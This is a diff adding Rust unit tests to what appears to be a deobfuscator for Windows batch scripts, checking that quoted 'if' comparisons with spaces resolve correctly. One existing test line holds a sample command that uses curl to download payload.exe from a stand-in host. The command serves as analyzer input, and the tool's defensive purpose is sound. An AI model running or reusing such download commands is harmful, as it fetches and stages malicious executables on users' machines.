@@ -9562,6 +9562,26 @@ mod if_tests {
     }
 
     #[test]
+    fn if_quoted_string_with_spaces_eq_runs_body() {
+        let script = b"if \"two words\"==\"two words\" set MARK=value\r\necho %MARK%\r\n";
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.deobfuscated.contains("echo value"),
+            "quoted comparison with spaces did not run inline body:\n{}\ntraits={:?}",
+            report.deobfuscated,
+            report.traits
+        );
+        assert!(
+            !report
+                .traits
+                .iter()
+                .any(|t| matches!(t, crate::traits::Trait::IfNotResolved { condition } if condition.contains("two words"))),
+            "quoted comparison with spaces should fold cleanly: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn if_cmd_child_preserves_delayed_expansion() {
         let script = br#"if "a"=="a" cmd.exe /V:ON /c "set U=https://if-wrapper.example/payload.exe&&curl -o payload.exe !U!""#;
         let report = analyze(script, &Config::default());
@@ -10185,6 +10205,27 @@ mod if_constant_fold_tests {
         assert!(
             !has_unresolved,
             "case-insensitive AMD64==amd64 should fold true"
+        );
+    }
+
+    #[test]
+    fn if_equ_quoted_string_with_spaces_runs_body() {
+        let script = b"if \"two words\" EQU \"two words\" set MARK=value\r\necho %MARK%\r\n";
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.deobfuscated.contains("echo value"),
+            "quoted EQU comparison with spaces did not run inline body:\n{}\ntraits={:?}",
+            report.deobfuscated,
+            report.traits
+        );
+        let has_unresolved = report
+            .traits
+            .iter()
+            .any(|t| matches!(t, crate::traits::Trait::IfNotResolved { .. }));
+        assert!(
+            !has_unresolved,
+            "quoted EQU comparison with spaces should fold cleanly: {:?}",
+            report.traits
         );
     }
 
